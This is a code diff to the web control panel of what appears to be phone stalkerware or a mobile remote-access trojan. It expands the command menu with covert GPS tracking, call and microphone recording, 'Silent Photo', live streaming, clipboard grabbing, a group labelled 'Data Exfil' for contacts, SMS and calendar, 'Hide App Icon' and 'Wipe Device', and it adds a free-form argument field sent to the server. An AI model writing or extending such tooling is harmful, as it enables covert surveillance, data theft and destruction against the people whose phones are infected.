@@ -33,16 +33,49 @@
         <div class="section-title">Send Command</div>
         <div class="cmd-form">
             <select id="cmd">
-                <option value="start_location">Start Location</option>
-                <option value="start_call_record">Record Calls</option>
-                <option value="start_audio">Start Audio</option>
-                <option value="sync_contacts">Sync Contacts</option>
-                <option value="sync_appusage">Sync App Usage</option>
-                <option value="take_screenshot">Screenshot</option>
-                <option value="sync_sms">Sync SMS</option>
-                <option value="capture_photo">Capture Photo</option>
-                <option value="stop_all">Stop All</option>
+                <optgroup label="Location">
+                    <option value="start_location">Start GPS Tracking</option>
+                    <option value="stop_location">Stop GPS Tracking</option>
+                </optgroup>
+                <optgroup label="Calls">
+                    <option value="start_call_record">Record Calls</option>
+                    <option value="stop_call_record">Stop Call Recording</option>
+                </optgroup>
+                <optgroup label="Audio">
+                    <option value="start_audio">Start Microphone</option>
+                    <option value="stop_audio">Stop Microphone</option>
+                </optgroup>
+                <optgroup label="Camera">
+                    <option value="capture_photo">Silent Photo</option>
+                </optgroup>
+                <optgroup label="Live Stream">
+                    <option value="start_livestream">Start Live Stream</option>
+                    <option value="stop_livestream">Stop Live Stream</option>
+                </optgroup>
+                <optgroup label="Screen">
+                    <option value="take_screenshot">Screenshot</option>
+                </optgroup>
+                <optgroup label="Data Exfil">
+                    <option value="sync_contacts">Sync Contacts</option>
+                    <option value="sync_sms">Sync SMS</option>
+                    <option value="sync_appusage">Sync App Usage</option>
+                    <option value="sync_calendar">Sync Calendar</option>
+                </optgroup>
+                <optgroup label="System">
+                    <option value="get_device_info">Get Device Info</option>
+                    <option value="get_clipboard">Get Clipboard</option>
+                    <option value="list_files">List Files</option>
+                    <option value="vibrate">Vibrate Device</option>
+                    <option value="ring">Ring Device</option>
+                    <option value="lock_device">Lock Screen</option>
+                    <option value="hide_icon">Hide App Icon</option>
+                </optgroup>
+                <optgroup label="Dangerous">
+                    <option value="stop_all">Stop All</option>
+                    <option value="wipe_device">Wipe Device</option>
+                </optgroup>
             </select>
+            <input type="text" id="args" placeholder="Args (optional)" style="width:200px;">
             <button onclick="sendCmd()">Send</button>
         </div>
 
@@ -84,10 +117,11 @@
     <script>
         async function sendCmd() {
             const cmd = document.getElementById('cmd').value;
+            const args = document.getElementById('args').value || null;
             await fetch('/api/send_command', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({device_id: '{{ device_id }}', cmd: cmd})
+                body: JSON.stringify({device_id: '{{ device_id }}', cmd: cmd, args: args})
             });
             location.reload();
         }
